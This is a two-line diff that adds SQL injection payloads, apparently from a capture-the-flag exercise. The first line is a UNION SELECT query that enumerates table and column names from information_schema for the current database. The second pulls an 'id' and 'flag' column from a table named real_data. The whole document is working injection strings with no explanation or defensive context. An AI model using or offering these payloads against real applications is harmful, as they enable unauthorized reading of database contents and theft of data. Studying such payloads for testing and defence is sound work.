@@ -1,0 +1,2 @@
+' UNION SELECT table_name,column_name,3,4,5,6 FROM information_schema.columns WHERE table_schema = DATABASE() -- 
+' UNION SELECT id,flag,3,4,5,6 FROM real_data -- 
